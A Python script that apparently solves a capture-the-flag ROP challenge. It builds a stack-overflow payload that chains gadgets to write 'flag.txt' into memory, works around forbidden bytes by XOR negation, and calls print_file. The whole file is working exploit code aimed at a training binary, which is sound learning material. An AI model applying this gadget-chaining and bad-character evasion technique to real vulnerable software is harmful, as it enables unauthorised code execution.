import struct

buf_addr       = 0x7fffffffdca0
saved_rip_addr = 0x7fffffffdcc8

print_file_addr = 0x400510
data_addr       = 0x601029

mov_r13_r12_addr  = 0x400634
load_r12_r15_addr = 0x40069c
load_r14_r15_addr = 0x4006a0
xor_r15_r14_addr  = 0x400628

pop_rdi_addr      = 0x4006a3

class Exploit():
    def __init__(self):
        self.payload = b""

        self.badchars = set([b"x", b"g", b"a", b"."])

    def pad(self, num_bytes):
        self.payload += b"z" * num_bytes

    def append_word(self, word):
        to_append = struct.pack("<Q", word)
        for bc in self.badchars:
            if bc in to_append:
                print("Warning: bad char {} in {}.".format(str(bc), str(to_append)))
                print(hex(word))
                #raise ValueError("bad char")
        self.payload += to_append

    def append_pop_rdi_chain(self, rdi):
        self.append_word(pop_rdi_addr)
        self.append_word(rdi)

    def append_write_chain(self, to_write, location):
        base_location = location
        to_write += b"\0" * (8 - len(to_write)%8)

        ### Replace bad characters with their negation.
        to_fix = []
        for i, c in enumerate(to_write):
            if bytes([c]) in self.badchars:
                ### This is a bad character. We'll replace it with
                ### its bitwise NOT, and then we'll go back in
                ### an XOR it with 0xff afterwards.
                to_write = to_write[: i] + bytes([0xff - c]) + to_write[i + 1:]
                to_fix.append(i)

        ### Write in the string with the bad characters replaced.
        for i in range(len(to_write) // 8):
            chunk = to_write[8*i : 8*i + 8]
            
            self.append_word(load_r12_r15_addr)
            self.payload += chunk
            self.append_word(location)
            self.append_word(0)
            self.append_word(0)

            self.append_word(mov_r13_r12_addr)

            location += 8

        ### Append chain to negate all locations that had
        ### a bad character.
        for idx in to_fix:
            self.append_word(load_r14_r15_addr)
            self.append_word(2**64 - 1)
            self.append_word(base_location + idx)
            
            self.append_word(xor_r15_r14_addr)
        
    def write(self, filename):
        with open(filename, "wb") as f:
            f.write(self.payload)
        print("Wrote {} bytes to {}".format(len(self.payload),
                                            filename))

exploit = Exploit()

exploit.pad(saved_rip_addr - buf_addr)

exploit.append_write_chain(b"flag.txt", data_addr)

exploit.append_pop_rdi_chain(data_addr)

exploit.append_word(print_file_addr)

exploit.write("payload")
